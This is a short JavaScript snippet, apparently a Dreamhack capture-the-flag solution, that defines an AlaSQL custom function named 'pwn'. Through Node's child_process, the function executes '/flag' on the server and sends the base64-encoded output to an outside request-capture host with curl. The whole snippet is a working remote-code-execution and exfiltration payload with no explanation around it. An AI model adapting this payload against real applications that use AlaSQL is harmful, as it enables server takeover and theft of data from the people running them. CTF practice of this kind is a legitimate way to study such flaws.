alasql.fn.pwn = async function() {
    const { execSync } = await import('child_process'); // CJS 환경 기준
    const result = execSync('/flag').toString().trim();
    execSync(`curl https://chzgpoe.request.dreamhack.games/?data=${btoa(result)}`); 
    return result; 
};
